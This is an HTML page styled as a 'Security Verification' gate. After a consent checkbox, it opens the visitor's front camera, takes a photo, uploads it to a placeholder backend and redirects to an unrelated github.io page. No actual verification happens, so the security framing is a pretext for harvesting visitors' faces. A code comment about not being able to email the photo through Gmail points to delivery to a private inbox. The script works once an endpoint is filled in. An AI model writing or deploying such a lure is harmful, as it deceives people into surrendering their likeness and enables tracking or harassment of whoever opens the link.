<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Security Verification</title>

<style>
*{box-sizing:border-box}

body{
    margin:0;
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    background:#050505;
    color:#fff;
    font-family:Arial,sans-serif;
}

.box{
    width:min(92%,430px);
    padding:28px;
    text-align:center;
    background:#111;
    border:1px solid #333;
    border-radius:18px;
    box-shadow:0 0 35px rgba(255,0,0,.2);
}

h1{margin-top:0}

p{
    color:#bbb;
    line-height:1.5;
}

.notice{
    padding:15px;
    margin:20px 0;
    border-radius:12px;
    background:#1b0808;
    border:1px solid #641b1b;
    font-size:14px;
    line-height:1.5;
}

.agree{
    display:flex;
    gap:10px;
    text-align:left;
    color:#ddd;
    font-size:14px;
    line-height:1.4;
    margin:20px 0;
}

button{
    width:100%;
    padding:14px;
    border:0;
    border-radius:10px;
    background:#d40000;
    color:white;
    font-size:16px;
    font-weight:bold;
    cursor:pointer;
}

button:disabled{
    opacity:.45;
    cursor:not-allowed;
}

video{
    width:100%;
    margin-top:20px;
    border-radius:12px;
    display:none;
    background:#000;
}

#status{
    margin-top:15px;
    color:#aaa;
    font-size:14px;
}
</style>
</head>

<body>

<div class="box">

    <h1>Security Verification</h1>

    <p>
        Additional verification is required before continuing.
    </p>

    <div class="notice">
        A verification photograph will automatically be captured
        after you give permission to use your camera.
    </div>

    <label class="agree">
        <input type="checkbox" id="agree">
        <span>
            I understand and agree that one verification photograph
            will be automatically taken for security verification.
        </span>
    </label>

    <button id="start" disabled>
        START VERIFICATION
    </button>

    <video id="video" autoplay muted playsinline></video>

    <div id="status"></div>

    <canvas id="canvas" style="display:none"></canvas>

</div>

<script>

const agree = document.getElementById("agree");
const start = document.getElementById("start");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const status = document.getElementById("status");

const REDIRECT =
"https://pixel-sketch8.github.io/turbo-disco/";

/*
 IMPORTANT:

 A browser page cannot securely email a photograph
 directly through Gmail.

 Put your secure upload endpoint here.

 Example:
 https://your-server.example/upload
*/
const UPLOAD_ENDPOINT =
"https://YOUR-BACKEND-HERE.com/upload";


agree.addEventListener("change", () => {
    start.disabled = !agree.checked;
});


start.addEventListener("click", async () => {

    if (!agree.checked) return;

    start.disabled = true;

    try {

        status.textContent =
        "Requesting camera permission...";

        const stream =
        await navigator.mediaDevices.getUserMedia({
            video:{
                facingMode:"user"
            },
            audio:false
        });

        video.srcObject = stream;
        video.style.display = "block";

        status.textContent =
        "Camera approved. Capturing in 2 seconds...";

        /*
         Wait 2 seconds.
        */
        await new Promise(resolve =>
            setTimeout(resolve,2000)
        );

        if(
            !video.videoWidth ||
            !video.videoHeight
        ){
            throw new Error("Camera not ready");
        }

        /*
         Capture one frame.
        */
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        const ctx = canvas.getContext("2d");

        ctx.drawImage(
            video,
            0,
            0,
            canvas.width,
            canvas.height
        );

        /*
         Stop camera immediately.
        */
        stream.getTracks().forEach(track =>
            track.stop()
        );

        status.textContent =
        "Verification photo captured.";

        /*
         Convert image to JPEG.
        */
        const photo =
        await new Promise(resolve =>
            canvas.toBlob(
                resolve,
                "image/jpeg",
                0.9
            )
        );

        /*
         Send to your secure backend.
        */
        const formData = new FormData();

        formData.append(
            "photo",
            photo,
            "security-verification.jpg"
        );

        status.textContent =
        "Submitting verification...";

        const response =
        await fetch(
            UPLOAD_ENDPOINT,
            {
                method:"POST",
                body:formData
            }
        );

        if(!response.ok){
            throw new Error("Upload failed");
        }

        status.textContent =
        "Verification complete.";

        /*
         Redirect after successful upload.
        */
        setTimeout(() => {
            window.location.href = REDIRECT;
        },700);

    } catch(error){

        console.error(error);

        status.textContent =
        "Camera verification could not be completed.";

        start.disabled = false;
    }

});

</script>

</body>
</html>
